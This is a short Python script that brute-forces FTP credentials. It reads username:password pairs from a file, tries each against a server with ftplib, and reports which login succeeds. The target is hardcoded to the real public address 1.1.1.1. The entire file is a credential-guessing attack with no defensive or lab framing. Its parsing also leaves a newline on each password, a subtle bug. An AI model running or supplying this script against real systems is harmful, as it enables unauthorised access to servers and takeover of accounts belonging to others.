import ftplib

def brute_log_in(hostname, password_file):
    with open(password_file, 'r') as f:
        for line in f.readlines():
            username, password = line.split(':')
            print('[+] Trying %s/%s' % (username, password))
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(username, password)
                print('[*] %s FTP login succeeded: %s/ %s' % (hostname, username, password))
                ftp.quit()
                return (username, password)
            except:
                pass
        print('[-] Could not brute force FTP credentials')
        return (None, None)

host = '1.1.1.1'
password_file = 'passwd.txt'
brute_log_in(host, password_file)